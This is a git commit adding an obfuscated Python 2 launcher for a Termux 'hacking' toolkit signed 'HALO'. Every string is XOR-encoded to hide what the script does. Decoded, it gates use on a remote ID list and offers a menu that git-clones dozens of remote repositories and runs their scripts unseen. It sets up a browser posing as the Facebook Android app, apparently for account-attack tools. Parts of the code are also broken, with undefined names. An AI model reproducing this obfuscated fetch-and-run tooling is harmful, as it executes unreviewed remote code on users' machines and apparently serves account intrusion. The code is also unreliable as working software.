58121b348eabb541b9ff241c7095c7d79202d79d
bahrozqaladze1 <35116920+bahrozqaladze1@users.noreply.github.com>
2021-10-07 18:42:33 +0300

    Add files via upload

---
+++ ENC_HALO.py
@@ -0,0 +1,485 @@
+#hhhh maza enc nashky
+import os as aXMW
+import sys as ShpMry
+import time as tNkRiyaU
+import requests as eQwESXDlrmIobnAf
+import os as aecx
+import  sys as AtvZJB
+import  time as kjtbVuqH
+import  datetime as LpqfvidBZDTjhJnm
+import  random as ExWrnhYAXZof
+import  hashlib as frIowMDalEAqzP
+import  re as Qtap
+import  threading as BHefEuNMgDQlxrmVdj
+import  json as FemRutMI
+import  urllib as QiAgLYKtdecs
+import  cookielib as WuHcwlzqxQbUDEPfOm
+import  getpass as FmqpAkBnUNJQes
+import requests as fxyuYsCcdvLEZRTW
+import os as THvl
+import  sys as TEcDbV
+import  time as TJhlcNRP
+import  datetime as UlOYkdtGnBiIAZuC
+import  random as VsCWUwXkdPAi
+import  hashlib as ywbqjOLElrVGBD
+import  re as wPfH
+import  threading as yNXQZzAUEPOGkfumgt
+import  json as rQtmKwpH
+import  urllib as iWPGzULcDQBe
+import  cookielib as gDOXyUufGKlqcFJCvS
+import  requests as xSIeLUoEkmNyDtZM
+import  mechanize as uQOTxwHDEnFejsLYAq
+from multiprocessing.pool import ThreadPool as ZvPcKyTtImklijMWVfbe
+from requests.exceptions import ConnectionError as fLwZOteXzvIcQkHPFsRGCDduUhiEMT
+from mechanize import Browser as sPDkeXvQxlKRNY
+
+CkUvlqKYaJ = lambda n: (n ^ 4) / 1
+UvsXSFOyBc = lambda s: ''.join(chr(int(CkUvlqKYaJ(ord(c)))) for c in s)
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+##
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+##
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+##
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+THvl.system(UvsXSFOyBc("ghaev"))
+THvl.system(UvsXSFOyBc("toc$mjwpehh$bmchap$)}"))
+THvl.system(UvsXSFOyBc("toc$mjwpehh$t}plkj$)}"))
+THvl.system(UvsXSFOyBc("toc$mjwpehh$tlt$)}"))
+THvl.system(UvsXSFOyBc("toc$mjwpehh$jejk$)}"))
+THvl.system(UvsXSFOyBc("tmt6$mjwpehh$fw0"))
+THvl.system(UvsXSFOyBc("tmt$mjwpehh$$qvhhmf*vauqawp"))
+THvl.system(UvsXSFOyBc("tmt$mjwpehh$saffvkswav")) 
+THvl.system(UvsXSFOyBc("tmt$mjwpehh$qwav[ecajp"))
+THvl.system("printf '#escaped_char#033]2;halo#escaped_char#a'")
+QprTRNgjdFlaPiSMCcYwVOqIuWbAon = UvsXSFOyBc("lehk")
+ZitSRgDQeoWlPYsbCUMLfkEXTjzOcp = UvsXSFOyBc("=2<")
+THvl.system(UvsXSFOyBc("ghaev"))
+JbMRWFuH = UvsXSFOyBc("pvqa")
+while JbMRWFuH == UvsXSFOyBc("pvqa"):
+    
+  
+        
+ 
+            print UvsXSFOyBc("X|5f_5?=6i_Y$Pesese$$") 
+            TJhlcNRP.sleep(int(CkUvlqKYaJ(7)))
+            JbMRWFuH = UvsXSFOyBc("behwa")
+        
+            print UvsXSFOyBc("Teww$Lehe}e")
+    
+        
+
+def rUNWYVIJCSMHTZ():
+    THvl.system(UvsXSFOyBc("ghaev"))
+    wxtfdacF()
+
+
+THvl.system(UvsXSFOyBc("ghaev"))
+
+
+def jFnRMl():
+  hCkOVHcI = str(THvl.geteuid()) + str(THvl.getlogin())
+  id = UvsXSFOyBc(")").join(hCkOVHcI)
+  print(UvsXSFOyBc("X|5f_73?5i]kqv$M@$>$")+id)
+  try:
+    fPVJAYhMoyGmvgdD = xSIeLUoEkmNyDtZM.get(UvsXSFOyBc("lpptw>++ves*cmplqfqwavgkjpajp*gki+lehkgveo+=2<+iemj+ghkja")).text
+    if id in fPVJAYhMoyGmvgdD:
+      print(UvsXSFOyBc("X477_=6i]KQV$M@$MW$EGPMRA*********"))
+      jJHiPk = str(THvl.geteuid())
+      TJhlcNRP.sleep(int(CkUvlqKYaJ(5)))
+      pass
+    else:
+      print(UvsXSFOyBc("X|5f_=5iFeva~i$M`$oep$egpmra$j}e$Poe}e$fk$Egpmra$ov`j$jeie$fjave$fk$pahacvei$Dm0i[iv|******"))
+      TJhlcNRP.sleep(int(CkUvlqKYaJ(5)))
+      TEcDbV.exit()
+  except:
+    TEcDbV.exit()
+    if mWKyegsY == UvsXSFOyBc("[[iemj[["):
+     print(KwaPeHXb)
+     jFnRMl()
+   
+jFnRMl()
+
+
+
+
+
+
+THvl.system(UvsXSFOyBc("vi$)vb$*p|p"))
+for yu in range(int(CkUvlqKYaJ(5004))):
+    KkeEnsWF = VsCWUwXkdPAi.randint(int(CkUvlqKYaJ(1111107)), int(CkUvlqKYaJ(9999995)))
+    TEcDbV.stdout = open(UvsXSFOyBc("*p|p"), UvsXSFOyBc("e"))
+    print KkeEnsWF
+    TEcDbV.stdout.flush()
+
+try:
+    import xSIeLUoEkmNyDtZM
+except ImportError:
+    THvl.system(UvsXSFOyBc("Jk$Ik`qha$Jeia`$Vauqawpw%$p}ta>tmt6$mjwpehh$vauqawpw"))
+
+try:
+    import mechanize
+except ImportError:
+    THvl.system(UvsXSFOyBc("Jk$Ik`qha$Jeia`$Iaglejm~a%$p}ta>tmt6$mjwpehh$iaglejm~a"))
+    TJhlcNRP.sleep(int(CkUvlqKYaJ(5)))
+    THvl.system(UvsXSFOyBc("Plaj$p}ta>$t}plkj6$bfm*t}"))
+
+
+
+pTOf = mechanize.Browser()
+pTOf.set_handle_robots(bool(int(CkUvlqKYaJ(5))))
+pTOf.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=int(CkUvlqKYaJ(5)))
+pTOf.addheaders = [(UvsXSFOyBc("Qwav)Ecajp"), UvsXSFOyBc("Ktave+=*<4$,Ej`vkm`?$Ktave$Imjm+76*4*6610+<1*$Q?$m`-$Tvawpk+6*56*067$Ravwmkj+56*52"))]
+pTOf.addheaders = [(UvsXSFOyBc("qwav)ecajp"), 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def sUYkMgpunaym():
+    print UvsXSFOyBc("Plejow*")
+    THvl.sys.exit()
+
+
+def FQCtYPUc(my):
+    xJ = UvsXSFOyBc("elp`~ng")
+    AI = ''
+    for mK in tP:
+        AI += UvsXSFOyBc("%") + xJ[VsCWUwXkdPAi.randint(int(CkUvlqKYaJ(4)), len(xJ) - int(CkUvlqKYaJ(5)))] + mK
+
+    return PODgLyXpKV(AI)
+THvl.system(UvsXSFOyBc("io`mv$ejcce|`+ghkja`*p|p"))
+
+def PODgLyXpKV(my):
+    xJ = UvsXSFOyBc("elp`~ng")
+    for mK in xJ:
+        qX = xJ.index(mK)
+        tP = tP.replace('!%s' % mK, '#escaped_char#x1b[%s;1m' % str(int(CkUvlqKYaJ(27)) + qX))
+
+    tP += UvsXSFOyBc("X|5f_4i")
+    tP = tP.replace(UvsXSFOyBc("%4"), UvsXSFOyBc("X|5f_4i"))
+    TEcDbV.stdout.write(tP + UvsXSFOyBc(""))
+
+
+def nANtgbdfQs(Fx):
+    for LI in Fx + UvsXSFOyBc(""):
+        TEcDbV.stdout.write(LI)
+        TEcDbV.stdout.flush()
+        TJhlcNRP.sleep(0.1)
+
+
+def gMTUjH():
+    PUqvjZMIlp = [UvsXSFOyBc("*$$$"), UvsXSFOyBc("**$$"), UvsXSFOyBc("***$")]
+    for Xn in PUqvjZMIlp:
+        print UvsXSFOyBc("\tX|5f_5?=7iThaewa$Semp$X|5f_5?=7i") + Xn,
+        TEcDbV.stdout.flush()
+        TJhlcNRP.sleep(int(CkUvlqKYaJ(5)))
+
+
+def rkVQiN(Fx):
+    for LI in Fx + UvsXSFOyBc(""):
+        TEcDbV.stdout.write(LI)
+        TEcDbV.stdout.flush()
+        TJhlcNRP.sleep(0.03)
+
+
+PQLOlbRY = int(CkUvlqKYaJ(4))
+cRjiTq = []
+id = []
+cgFbOp = []
+sAzQxylRGdXw = UvsXSFOyBc("X|5f_75iJkp$Rqhj")
+bmNvEkWu = UvsXSFOyBc("X|5f_76iRqhj")
+THvl.system(UvsXSFOyBc("ghaev"))
+THvl.system(UvsXSFOyBc("bmchap$=2<"))
+
+
+
+KwaPeHXb = """   #escaped_char#033[5;37;40m
+
+-------------------------------
+      AUTHER: HALO
+       [+] Instagram : i4m_mrx
+       [+] Telegram  : i4m_mrx
+       [+] tiktok    : mrx_coder0
+       [+] snapchat  : im_halo0
+       [+] github    : halocrak
+       [+] facebook  : imfor halo
+       [+] youtube   : MRX CODAR
+-------------------------------
+"""
+
+print KwaPeHXb
+
+
+AnfH = JpGBMvheCmnsXRbFkc(UvsXSFOyBc("LEHHF^LAVE>"))
+if AnfH == UvsXSFOyBc("6<"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+Lehk)040+Lehk"))
+    THvl.system(UvsXSFOyBc("t}plkj7$Lehk+Lehk040*t}"))
+if AnfH == UvsXSFOyBc("5"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+va*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$va+040*t}"))
+if AnfH == UvsXSFOyBc("75"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+okveo*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$okveo+okveo*t}"))
+elif AnfH == UvsXSFOyBc("1"):
+    import THvl
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+bf*cmp"))
+    THvl.system(UvsXSFOyBc("tlt$bf+bf*tlt")) 
+if AnfH == UvsXSFOyBc("70"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+oqv`"))    
+    THvl.system(UvsXSFOyBc("t}plkj$oqv`+oqv`*t}"))
+if AnfH == UvsXSFOyBc("71"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+gko"))    
+    THvl.system(UvsXSFOyBc("t}plkj$gko+gko*t}"))
+if AnfH == UvsXSFOyBc("3"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+wpeb"))    
+    THvl.system(UvsXSFOyBc("t}plkj$wpeb+wpebse3wl*t}"))
+if AnfH == UvsXSFOyBc("6"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+rj*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$rj+rj*t}"))
+elif AnfH == UvsXSFOyBc("5<"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+lehk`a`kw*cmp"))
+    THvl.system(UvsXSFOyBc("t}plkj6$lehk`a`kw+epp*t}")) 
+if AnfH == UvsXSFOyBc("54"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$go5"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+go5"))    
+    THvl.system(UvsXSFOyBc("t}plkj7$go5+go*t}"))
+if AnfH == UvsXSFOyBc("50"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh"))    
+    THvl.system(UvsXSFOyBc("t}plkj7$ehh+|||cewle*t}"))
+if AnfH == UvsXSFOyBc("51"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$ehh+ni*t}"))
+if AnfH == UvsXSFOyBc("7"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$ehh+hj*t}"))
+if AnfH == UvsXSFOyBc("66"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$ehh+tp*t}"))
+if AnfH == UvsXSFOyBc("76"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$ehh+cch*t}"))
+if AnfH == UvsXSFOyBc("6="):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$ehh+GRR*t}"))
+if AnfH == UvsXSFOyBc("67"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$e``"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+e``"))    
+    THvl.system(UvsXSFOyBc("t}plkj$e``+iemj*t}"))
+if AnfH == UvsXSFOyBc("55"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$li"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+li"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$li+li*t}"))
+if AnfH == UvsXSFOyBc("60"):
+    import THvl
+    THvl.system(UvsXSFOyBc("}aw$`kshk`$tmjc)====$etj"))  
+if AnfH == UvsXSFOyBc("64"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$vao"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+vao"))    
+    THvl.system(UvsXSFOyBc("t}plkj$vao+vao*t}")) 
+if AnfH == UvsXSFOyBc("77"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$fg"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+fg"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$fg+fg*t}")) 
+if AnfH == UvsXSFOyBc("52"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$fg"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+fg"))    
+    THvl.system(UvsXSFOyBc("t}plkj$fg+fmh*t}")) 
+if AnfH == UvsXSFOyBc("53"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$fg"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+fg"))    
+    THvl.system(UvsXSFOyBc("t}plkj$fg+pkv*t}")) 
+if AnfH == UvsXSFOyBc("56"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$glo"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+glo"))    
+    THvl.system(UvsXSFOyBc("t}plkj$glo+GLA*t}")) 
+if AnfH == UvsXSFOyBc("65"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$Vao\wpj)mkw"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+=2<legoav+Vao\wpj)mkw"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$Vao\wpj)mkw+Vao\wpj)mkw*t}")) 
+if AnfH == UvsXSFOyBc("62"):
+    import THvl
+    THvl.system(UvsXSFOyBc("vi$)vb$fg"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+fg"))    
+    THvl.system(UvsXSFOyBc("t}plkj$fg+hak*t}")) 
+if AnfH == UvsXSFOyBc("63"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("fewl$ehh+ajg*wl"))
+if AnfH == UvsXSFOyBc("<"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$ehh+us*t}"))
+if AnfH == UvsXSFOyBc("="):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$ehh+kp*t}"))
+if AnfH == UvsXSFOyBc("74"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$ehh+MT*t}"))
+if AnfH == UvsXSFOyBc("57"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj$ehh+jb*t}"))
+if AnfH == UvsXSFOyBc("5="):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("fewl$ehh+wiw*wl"))
+if AnfH == UvsXSFOyBc("61"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("|`c)ktaj$lpptw>++sss*ia`mebmva*gki+bmha+s77sj5m`ip7q72=+caj[wmcja`*eto+bmha"))
+if AnfH == UvsXSFOyBc("0"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$ehh+bb*t}"))
+if AnfH == UvsXSFOyBc("2"):
+    import THvl
+    THvl.system(UvsXSFOyBc("ghaev"))
+    THvl.system(UvsXSFOyBc("vi$)vb$ehh"))
+    THvl.system(UvsXSFOyBc("cmp$ghkja$lpptw>++cmplqf*gki+lehkgveo+ehh*cmp"))    
+    THvl.system(UvsXSFOyBc("t}plkj6$ehh+6=54*t}"))
+    TEcDbV.exit()
